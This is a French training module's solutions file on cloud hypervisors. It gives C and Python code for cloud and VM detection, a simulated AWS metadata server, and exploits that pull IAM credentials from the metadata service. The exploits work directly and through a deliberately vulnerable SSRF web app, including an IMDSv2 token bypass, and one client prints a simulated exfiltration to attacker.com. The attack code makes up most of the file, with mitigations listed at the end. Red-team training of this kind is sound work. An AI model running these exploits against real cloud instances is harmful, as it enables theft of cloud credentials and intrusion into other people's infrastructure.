# Solutions - Cloud Hypervisors

Ce fichier contient les solutions complètes des exercices du module Cloud Hypervisors.

---

## Solution Exercice 1 : Détection basique (Très facile)

### Objectif
Détecter si l'environnement est dans un cloud provider (AWS/Azure/GCP).

### Code complet

```c
/*
 * Détection multi-cloud : AWS, Azure, GCP
 *
 * Compilation :
 *   gcc -o detect_cloud detect_cloud.c -lcurl
 *
 * Usage :
 *   ./detect_cloud
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <cpuid.h>

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

/*
 * Test CPUID pour identifier l'hyperviseur
 */
void detect_hypervisor_cpuid(void) {
    uint32_t eax, ebx, ecx, edx;
    char vendor[13] = {0};

    printf("[*] Test CPUID...\n");

    __cpuid(1, eax, ebx, ecx, edx);

    if (ecx & (1 << 31)) {
        __cpuid(0x40000000, eax, ebx, ecx, edx);

        memcpy(vendor, &ebx, 4);
        memcpy(vendor + 4, &ecx, 4);
        memcpy(vendor + 8, &edx, 4);

        printf("[+] Hyperviseur détecté : %s\n", vendor);

        if (strcmp(vendor, "KVMKVMKVM") == 0) {
            printf("    → Probablement AWS Nitro ou GCP\n");
        } else if (strcmp(vendor, "Microsoft Hv") == 0) {
            printf("    → Azure Hyper-V\n");
        }
    } else {
        printf("[-] Pas d'hyperviseur détecté via CPUID\n");
    }
}

/*
 * Test AWS IMDS
 */
int test_aws_imds(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};

    printf("\n[*] Test AWS...\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/latest/meta-data/instance-id");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] AWS détecté !\n");
        printf("    Instance ID : %s\n", response);
        curl_easy_cleanup(curl);
        return 1;
    }

    printf("[-] Pas de réponse AWS IMDS\n");
    curl_easy_cleanup(curl);
    return 0;
}

/*
 * Test Azure IMDS
 */
int test_azure_imds(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    struct curl_slist *headers = NULL;

    printf("\n[*] Test Azure...\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    headers = curl_slist_append(headers, "Metadata: true");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] Azure détecté !\n");
        printf("    Métadonnées reçues (%lu bytes)\n", strlen(response));
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        return 1;
    }

    printf("[-] Pas de réponse Azure IMDS\n");
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}

/*
 * Test GCP IMDS
 */
int test_gcp_imds(void) {
    CURL *curl;
    CURLcode res;
    char response[4096] = {0};
    struct curl_slist *headers = NULL;

    printf("\n[*] Test GCP...\n");

    curl = curl_easy_init();
    if (!curl) return 0;

    headers = curl_slist_append(headers, "Metadata-Flavor: Google");

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://metadata.google.internal/computeMetadata/v1/instance/name");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        printf("[+] GCP détecté !\n");
        printf("    Instance Name : %s\n", response);
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        return 1;
    }

    printf("[-] Pas de réponse GCP IMDS\n");
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return 0;
}

int main(void) {
    printf("═══════════════════════════════════════════════════════════\n");
    printf("          Détection Cloud Multi-Provider\n");
    printf("═══════════════════════════════════════════════════════════\n\n");

    // Test CPUID
    detect_hypervisor_cpuid();

    // Test IMDS
    int aws = test_aws_imds();
    int azure = test_azure_imds();
    int gcp = test_gcp_imds();

    printf("\n═══════════════════════════════════════════════════════════\n");
    printf("                      RÉSULTAT\n");
    printf("═══════════════════════════════════════════════════════════\n");

    if (aws) {
        printf("CLOUD PROVIDER : AWS (Amazon EC2)\n");
    } else if (azure) {
        printf("CLOUD PROVIDER : Azure (Microsoft)\n");
    } else if (gcp) {
        printf("CLOUD PROVIDER : GCP (Google Cloud)\n");
    } else {
        printf("CLOUD PROVIDER : Aucun détecté (Bare Metal ou VM locale)\n");
    }

    printf("═══════════════════════════════════════════════════════════\n");

    return 0;
}
```

### Compilation et test

```bash
gcc -o detect_cloud solution1.c -lcurl
./detect_cloud
```

### Résultat sur AWS EC2

```
═══════════════════════════════════════════════════════════
          Détection Cloud Multi-Provider
═══════════════════════════════════════════════════════════

[*] Test CPUID...
[+] Hyperviseur détecté : KVMKVMKVM
    → Probablement AWS Nitro ou GCP

[*] Test AWS...
[+] AWS détecté !
    Instance ID : i-0123456789abcdef0

[*] Test Azure...
[-] Pas de réponse Azure IMDS

[*] Test GCP...
[-] Pas de réponse GCP IMDS

═══════════════════════════════════════════════════════════
                      RÉSULTAT
═══════════════════════════════════════════════════════════
CLOUD PROVIDER : AWS (Amazon EC2)
═══════════════════════════════════════════════════════════
```

---

## Solution Exercice 2 : Simulation IMDS (Facile)

### Serveur IMDS de simulation (Python)

```python
#!/usr/bin/env python3
"""
Serveur de simulation IMDS AWS pour tests locaux

Usage:
    sudo python3 fake_imds.py

Nécessite:
    pip3 install flask
"""

from flask import Flask, jsonify, request

app = Flask(__name__)

# Données simulées
INSTANCE_ID = "i-1234567890abcdef0"
AVAILABILITY_ZONE = "us-east-1a"
IAM_ROLE = "MyTestRole"

@app.route('/latest/meta-data/')
def meta_data_root():
    return """ami-id
instance-id
instance-type
local-hostname
local-ipv4
iam/
"""

@app.route('/latest/meta-data/instance-id')
def instance_id():
    return INSTANCE_ID

@app.route('/latest/meta-data/instance-type')
def instance_type():
    return "t3.micro"

@app.route('/latest/meta-data/local-ipv4')
def local_ipv4():
    return "172.31.42.42"

@app.route('/latest/meta-data/iam/')
def iam_root():
    return "security-credentials/\n"

@app.route('/latest/meta-data/iam/security-credentials/')
def list_roles():
    return IAM_ROLE + "\n"

@app.route(f'/latest/meta-data/iam/security-credentials/{IAM_ROLE}')
def get_credentials():
    return jsonify({
        "Code": "Success",
        "LastUpdated": "2025-01-01T00:00:00Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "EXAMPLE_SESSION_TOKEN_STRING",
        "Expiration": "2025-12-31T23:59:59Z"
    })

@app.route('/latest/user-data')
def user_data():
    return "#!/bin/bash\necho 'Hello from user-data'\n"

if __name__ == '__main__':
    print("[*] Serveur IMDS AWS simulé")
    print("[*] Écoute sur http://169.254.169.254:80")
    print("[*] Utilisez Ctrl+C pour arrêter")
    print()
    print("[!] Nécessite sudo pour bind sur port 80")

    # Nécessite sudo pour port 80
    app.run(host='169.254.169.254', port=80, debug=False)
```

### Client pour exploiter IMDS (C)

```c
/*
 * Exploit du serveur IMDS simulé
 *
 * Compilation :
 *   gcc -o exploit_imds exploit_imds.c -lcurl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

void exploit_imds(void) {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    char url[512];

    printf("═══════════════════════════════════════════════════════════\n");
    printf("            Exploitation IMDS AWS\n");
    printf("═══════════════════════════════════════════════════════════\n\n");

    // Étape 1 : Lister les rôles IAM
    printf("[Étape 1] Énumération des rôles IAM disponibles\n");
    printf("───────────────────────────────────────────────────────────\n");

    curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && strlen(response) > 0) {
        response[strcspn(response, "\n")] = 0;  // Enlever \n
        printf("[+] Rôle IAM trouvé : %s\n\n", response);

        // Étape 2 : Récupérer les credentials
        printf("[Étape 2] Récupération des credentials IAM\n");
        printf("───────────────────────────────────────────────────────────\n");

        snprintf(url, sizeof(url),
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/%s",
            response);

        memset(response, 0, sizeof(response));
        curl_easy_setopt(curl, CURLOPT_URL, url);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            printf("[+] Credentials récupérés :\n\n");
            printf("%s\n", response);

            // Étape 3 : Exfiltration (simulation)
            printf("\n[Étape 3] Exfiltration vers C2 (simulation)\n");
            printf("───────────────────────────────────────────────────────────\n");
            printf("[*] POST https://attacker.com/c2/exfil\n");
            printf("[*] Data: %lu bytes\n", strlen(response));
            printf("[+] Exfiltration réussie !\n");
        }
    } else {
        printf("[-] Erreur : Pas de rôle IAM attaché\n");
    }

    curl_easy_cleanup(curl);

    printf("\n═══════════════════════════════════════════════════════════\n");
}

int main(void) {
    exploit_imds();
    return 0;
}
```

### Test complet

Terminal 1 (serveur) :
```bash
sudo python3 fake_imds.py
```

Terminal 2 (client) :
```bash
gcc -o exploit_imds solution2.c -lcurl
./exploit_imds
```

---

## Solution Exercice 3 : Détection avancée (Moyen)

### Code complet avec scoring

```c
/*
 * Détecteur cloud avec système de scoring multi-méthodes
 *
 * Compilation :
 *   gcc -o cloud_detect_advanced solution3.c -lcurl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cpuid.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/time.h>

typedef struct {
    int cpuid_score;
    int imds_score;
    int dmi_score;
    int mac_score;
    int timing_score;
} cloud_score_t;

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

/*
 * Test 1 : CPUID Hypervisor Vendor
 */
int test_cpuid(cloud_score_t *score) {
    uint32_t eax, ebx, ecx, edx;
    char vendor[13] = {0};

    printf("[Test 1] CPUID Hypervisor Vendor\n");

    __cpuid(1, eax, ebx, ecx, edx);

    if (ecx & (1 << 31)) {
        __cpuid(0x40000000, eax, ebx, ecx, edx);

        memcpy(vendor, &ebx, 4);
        memcpy(vendor + 4, &ecx, 4);
        memcpy(vendor + 8, &edx, 4);

        printf("  [+] Hyperviseur : %s\n", vendor);

        if (strcmp(vendor, "KVMKVMKVM") == 0) {
            printf("  [+] KVM détecté (AWS Nitro ou GCP)\n");
            score->cpuid_score = 1;
            return 1;
        } else if (strcmp(vendor, "Microsoft Hv") == 0) {
            printf("  [+] Hyper-V détecté (Azure)\n");
            score->cpuid_score = 1;
            return 1;
        }
    }

    printf("  [-] Pas d'hyperviseur détecté\n");
    return 0;
}

/*
 * Test 2 : Instance Metadata Service
 */
int test_imds(cloud_score_t *score) {
    CURL *curl;
    CURLcode res;
    char response[1024] = {0};
    struct curl_slist *headers = NULL;

    printf("\n[Test 2] Instance Metadata Service\n");

    // Test AWS
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://169.254.169.254/latest/meta-data/instance-id");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK && strlen(response) > 0) {
            printf("  [+] AWS IMDS accessible\n");
            score->imds_score = 1;
            curl_easy_cleanup(curl);
            return 1;
        }
        curl_easy_cleanup(curl);
    }

    // Test Azure
    memset(response, 0, sizeof(response));
    curl = curl_easy_init();
    if (curl) {
        headers = curl_slist_append(headers, "Metadata: true");
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK && strlen(response) > 0) {
            printf("  [+] Azure IMDS accessible\n");
            score->imds_score = 1;
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            return 1;
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    // Test GCP
    memset(response, 0, sizeof(response));
    curl = curl_easy_init();
    if (curl) {
        headers = curl_slist_append(headers, "Metadata-Flavor: Google");
        curl_easy_setopt(curl, CURLOPT_URL,
            "http://metadata.google.internal/computeMetadata/v1/");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

        res = curl_easy_perform(curl);

        if (res == CURLE_OK && strlen(response) > 0) {
            printf("  [+] GCP IMDS accessible\n");
            score->imds_score = 1;
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            return 1;
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    printf("  [-] Aucun IMDS détecté\n");
    return 0;
}

/*
 * Test 3 : DMI/SMBIOS
 */
int test_dmi(cloud_score_t *score) {
    FILE *fp;
    char buffer[256];

    printf("\n[Test 3] DMI/SMBIOS\n");

    const char *dmi_files[] = {
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/bios_vendor",
        NULL
    };

    const char *cloud_keywords[] = {
        "Amazon", "EC2", "Google", "Microsoft", "Azure", NULL
    };

    for (int i = 0; dmi_files[i] != NULL; i++) {
        fp = fopen(dmi_files[i], "r");
        if (fp) {
            if (fgets(buffer, sizeof(buffer), fp)) {
                buffer[strcspn(buffer, "\n")] = 0;

                for (int j = 0; cloud_keywords[j] != NULL; j++) {
                    if (strstr(buffer, cloud_keywords[j])) {
                        printf("  [+] Keyword cloud trouvé : %s\n", buffer);
                        score->dmi_score = 1;
                        fclose(fp);
                        return 1;
                    }
                }
            }
            fclose(fp);
        }
    }

    printf("  [-] Pas de keyword cloud dans DMI\n");
    return 0;
}

/*
 * Test 4 : MAC Address
 */
int test_mac(cloud_score_t *score) {
    FILE *fp;
    char line[256];

    printf("\n[Test 4] MAC Address\n");

    fp = popen("ip link show 2>/dev/null | grep 'link/ether'", "r");
    if (!fp) {
        printf("  [-] Impossible de lire les MACs\n");
        return 0;
    }

    const char *cloud_mac_prefixes[] = {
        "02:",     // AWS (random)
        "00:0d:3a", // Azure
        "42:01",   // GCP
        NULL
    };

    while (fgets(line, sizeof(line), fp)) {
        char *mac = strstr(line, "link/ether");
        if (mac) {
            mac += 11;

            for (int i = 0; cloud_mac_prefixes[i] != NULL; i++) {
                if (strncasecmp(mac, cloud_mac_prefixes[i],
                    strlen(cloud_mac_prefixes[i])) == 0) {
                    printf("  [+] MAC cloud détectée : %.17s\n", mac);
                    score->mac_score = 1;
                    pclose(fp);
                    return 1;
                }
            }
        }
    }

    pclose(fp);
    printf("  [-] Pas de MAC cloud détectée\n");
    return 0;
}

/*
 * Test 5 : Timing (VMs sont plus lentes)
 */
int test_timing(cloud_score_t *score) {
    printf("\n[Test 5] Timing Analysis\n");

    static inline uint64_t rdtsc(void) {
        uint32_t lo, hi;
        asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
        return ((uint64_t)hi << 32) | lo;
    }

    uint64_t start, end, total = 0;

    for (int i = 0; i < 10; i++) {
        uint32_t eax, ebx, ecx, edx;
        start = rdtsc();
        __cpuid(0, eax, ebx, ecx, edx);
        end = rdtsc();
        total += (end - start);
    }

    uint64_t avg = total / 10;
    printf("  [*] Latence CPUID moyenne : %llu cycles\n", avg);

    if (avg > 1000) {
        printf("  [+] Latence élevée (VM probable)\n");
        score->timing_score = 1;
        return 1;
    }

    printf("  [-] Latence normale (bare metal probable)\n");
    return 0;
}

int main(void) {
    cloud_score_t score = {0};

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║     Détection Cloud Avancée avec Scoring                ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    test_cpuid(&score);
    test_imds(&score);
    test_dmi(&score);
    test_mac(&score);
    test_timing(&score);

    int total = score.cpuid_score + score.imds_score + score.dmi_score +
                score.mac_score + score.timing_score;

    printf("\n╔══════════════════════════════════════════════════════════╗\n");
    printf("║                    RÉSULTAT FINAL                        ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║ Score de confiance : %d/5                                 ║\n", total);
    printf("╠══════════════════════════════════════════════════════════╣\n");

    if (total >= 3) {
        printf("║ VERDICT : Environnement CLOUD détecté (haute confiance) ║\n");
    } else if (total > 0) {
        printf("║ VERDICT : Possible VM/Cloud (confiance faible)          ║\n");
    } else {
        printf("║ VERDICT : Bare metal probable                           ║\n");
    }

    printf("╚══════════════════════════════════════════════════════════╝\n");

    return 0;
}
```

---

## Solution Exercice 4 : Exploitation SSRF (Difficile)

### Serveur web vulnérable (Python)

```python
#!/usr/bin/env python3
"""
Application web vulnérable à SSRF pour tests

Usage:
    python3 vulnerable_app.py
"""

from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <h1>Vulnerable SSRF App</h1>
    <form action="/fetch" method="get">
        URL: <input type="text" name="url" size="50" value="http://example.com">
        <input type="submit" value="Fetch">
    </form>
    """

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')

    if not url:
        return "No URL provided", 400

    # VULNÉRABILITÉ SSRF : Pas de validation
    try:
        response = requests.get(url, timeout=5)
        return f"""
        <h2>Response</h2>
        <pre>{response.text}</pre>
        """
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    print("[*] Serveur vulnérable SSRF")
    print("[*] http://localhost:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)
```

### Exploit SSRF en C

```c
/*
 * Exploit SSRF pour accès IMDS
 *
 * Compilation :
 *   gcc -o ssrf_exploit solution4.c -lcurl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

void exploit_ssrf(const char *target_app, const char *imds_endpoint) {
    CURL *curl;
    CURLcode res;
    char exploit_url[2048] = {0};
    char response[8192] = {0};

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║              Exploitation SSRF → IMDS                   ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    // Construire l'URL d'exploitation
    snprintf(exploit_url, sizeof(exploit_url),
        "%s/fetch?url=%s", target_app, imds_endpoint);

    printf("[*] URL d'exploitation :\n");
    printf("    %s\n\n", exploit_url);

    curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, exploit_url);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    printf("[*] Exploitation en cours...\n");

    res = curl_easy_perform(curl);

    if (res == CURLE_OK) {
        printf("[+] Réponse reçue :\n\n");
        printf("%s\n", response);

        // Extraire les credentials (simulation)
        if (strstr(response, "AccessKeyId")) {
            printf("\n[!] CREDENTIALS IAM EXFILTRÉS !\n");
            printf("[*] Exfiltration vers C2...\n");
            printf("[+] Succès !\n");
        }
    } else {
        printf("[-] Erreur : %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
}

int main(void) {
    const char *target = "http://localhost:8080";

    // Test 1 : Lister les rôles
    printf("\n[Étape 1] Énumération des rôles IAM\n");
    printf("─────────────────────────────────────────────────────────\n");
    exploit_ssrf(target,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/");

    printf("\n\n[Étape 2] Récupération des credentials\n");
    printf("─────────────────────────────────────────────────────────\n");
    exploit_ssrf(target,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyTestRole");

    return 0;
}
```

---

## Solution Exercice 5 : IMDSv2 Bypass (Très difficile)

### Exploit IMDSv2 avec PUT

```c
/*
 * Exploitation IMDSv2 via SSRF avec support PUT
 *
 * IMDSv2 nécessite :
 * 1. PUT request pour obtenir un token
 * 2. GET request avec le token en header
 *
 * Si la SSRF supporte PUT, on peut bypass IMDSv2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    strncat((char *)userp, (char *)contents, realsize);
    return realsize;
}

/*
 * Étape 1 : Obtenir le token IMDSv2 via SSRF
 */
int get_imdsv2_token(const char *ssrf_url, char *token_out) {
    CURL *curl;
    CURLcode res;
    char exploit_url[2048];
    char response[512] = {0};

    // Encoder l'URL IMDS pour la SSRF
    snprintf(exploit_url, sizeof(exploit_url),
        "%s/fetch?url=%s&method=PUT&header=%s",
        ssrf_url,
        "http://169.254.169.254/latest/api/token",
        "X-aws-ec2-metadata-token-ttl-seconds: 21600");

    printf("[*] Étape 1 : Obtention du token IMDSv2\n");
    printf("    URL : %s\n", exploit_url);

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, exploit_url);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || strlen(response) == 0) {
        printf("[-] Échec de l'obtention du token\n");
        return -1;
    }

    // Extraire le token de la réponse HTML
    char *token_start = strstr(response, "<pre>");
    if (token_start) {
        token_start += 5;
        char *token_end = strstr(token_start, "</pre>");
        if (token_end) {
            size_t len = token_end - token_start;
            strncpy(token_out, token_start, len);
            token_out[len] = '\0';

            printf("[+] Token obtenu : %.50s...\n", token_out);
            return 0;
        }
    }

    strcpy(token_out, response);
    printf("[+] Token obtenu\n");
    return 0;
}

/*
 * Étape 2 : Utiliser le token pour accéder IMDS
 */
int exploit_with_token(const char *ssrf_url, const char *token) {
    CURL *curl;
    CURLcode res;
    char exploit_url[2048];
    char header[1024];
    char response[8192] = {0};

    // Construire le header avec le token
    snprintf(header, sizeof(header), "X-aws-ec2-metadata-token: %s", token);

    // Exploiter IMDS avec le token
    snprintf(exploit_url, sizeof(exploit_url),
        "%s/fetch?url=%s&header=%s",
        ssrf_url,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        header);

    printf("\n[*] Étape 2 : Accès IMDS avec token\n");
    printf("    URL : %s\n", exploit_url);

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, exploit_url);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK) {
        printf("[+] Réponse reçue :\n%s\n", response);
        return 0;
    }

    printf("[-] Échec de l'accès IMDS\n");
    return -1;
}

int main(void) {
    const char *ssrf_url = "http://localhost:8080";
    char token[512] = {0};

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║            Bypass IMDSv2 via SSRF avec PUT              ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    if (get_imdsv2_token(ssrf_url, token) == 0) {
        exploit_with_token(ssrf_url, token);
    }

    printf("\n[*] Analyse OPSEC :\n");
    printf("    - Logs CloudTrail : PUT /latest/api/token (suspect)\n");
    printf("    - Logs applicatifs : Requêtes vers 169.254.169.254\n");
    printf("    - WAF : Peut détecter pattern IMDS dans URL\n");
    printf("\n[*] Mitigations :\n");
    printf("    - Bloquer 169.254.169.254 au niveau firewall\n");
    printf("    - IMDSv2 obligatoire (désactiver IMDSv1)\n");
    printf("    - Whitelist des destinations pour fetch()\n");
    printf("    - Monitoring des accès IMDS\n");

    return 0;
}
```

---

## Points clés à retenir

1. **IMDS** est une surface d'attaque critique dans le cloud
2. **AWS Nitro** utilise KVM, **Azure** utilise Hyper-V, **GCP** utilise KVM
3. **SSRF** permet d'accéder à IMDS depuis une application vulnérable
4. **IMDSv2** ajoute une protection mais peut être bypassé si PUT est autorisé
5. La **détection multi-méthodes** (CPUID + IMDS + DMI + MAC + Timing) est plus fiable

## Impact Red Team

- **Exfiltration de credentials** : AccessKeyId, SecretAccessKey, Tokens
- **Lateral movement** : Utiliser les credentials pour accéder à d'autres ressources
- **Persistence** : Créer de nouveaux comptes IAM/Azure AD
- **Escalade de privilèges** : Exploiter les permissions du rôle IAM

## Défenses recommandées

1. Bloquer l'accès à 169.254.169.254 sauf pour les services légitimes
2. Activer IMDSv2 uniquement (désactiver IMDSv1)
3. Principe du moindre privilège pour les rôles IAM/Managed Identity
4. Monitoring des accès IMDS dans les logs
5. Network segmentation et firewalls
